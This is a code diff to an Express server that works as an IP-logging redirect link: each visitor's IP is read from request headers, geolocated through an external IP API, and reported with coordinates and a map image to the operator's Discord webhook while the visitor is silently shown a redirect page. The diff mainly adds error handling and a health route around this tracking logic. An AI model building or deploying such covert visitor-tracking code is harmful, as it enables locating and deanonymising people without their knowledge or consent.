@@ -31,12 +31,16 @@ app.use(
 );
 
 // Colors
-var colors = require("colors/safe");
+import colors from "colors";
 
 // Discord
 import Discord from "discord.js";
 
 // Routes
+app.get("/health", (_req, res) => {
+  res.send("OK");
+});
+
 app.get("*", async (req, res): Promise<void> => {
   const ipHeaders =
     req.headers["cf-connecting-ip"] ??
@@ -46,13 +50,15 @@ app.get("*", async (req, res): Promise<void> => {
   const ip = ipHeaders.toString().replace("::ffff:", "");
 
   if (ip) {
-    const url = "https://ipapi.lauty.dev/" + ip + "?fields=66846719";
+    // Discord webhook
+    const webhookClient = new Discord.WebhookClient({
+      url: `${process.env.WH_URL}`,
+    });
 
-    const info = await axios.get(url);
-    const data = info.data;
-
-    res.set("Content-Type", "text/html; charset=utf-8");
-    res.send(`<!DOCTYPE html>
+    // Redirect function
+    function redirect() {
+      res.set("Content-Type", "text/html; charset=utf-8");
+      res.send(`<!DOCTYPE html>
         <html lang="en">
         <head>
           <title>Redirect</title>
@@ -63,12 +69,26 @@ app.get("*", async (req, res): Promise<void> => {
           </script>
         </body>
         </html>`);
+    }
 
-    // Discord
-    const webhookClient = new Discord.WebhookClient({
-      url: `${process.env.WH_URL}`,
-    });
+    // IPApi
+    const url = "https://ipapi.lauty.dev/" + ip + "?fields=66846719";
+    let data;
 
+    try {
+      const info = await axios.get(url);
+      data = info.data;
+    } catch (error) {
+      webhookClient.send({
+        content: "IPApi did not respond",
+      });
+      redirect();
+      return console.log("IPApi did not respond".red);
+    }
+
+    redirect();
+
+    // Discord embed
     const embed = new Discord.EmbedBuilder()
       .setTitle("New entry")
       .addFields(
@@ -120,10 +140,11 @@ app.get("*", async (req, res): Promise<void> => {
           data.lon || 0
         }%2C${data.lat || 0}%5D%7D)/${data.lon || 0},${
           data.lat || 0
-        },3/500x300?access_token=${process.env.MAPBOX_TOKEN}`
+        },5/500x300?access_token=${process.env.MAPBOX_TOKEN}`
       );
     }
 
+    // Send embed
     webhookClient.send({ embeds: [embed] });
   }
 });
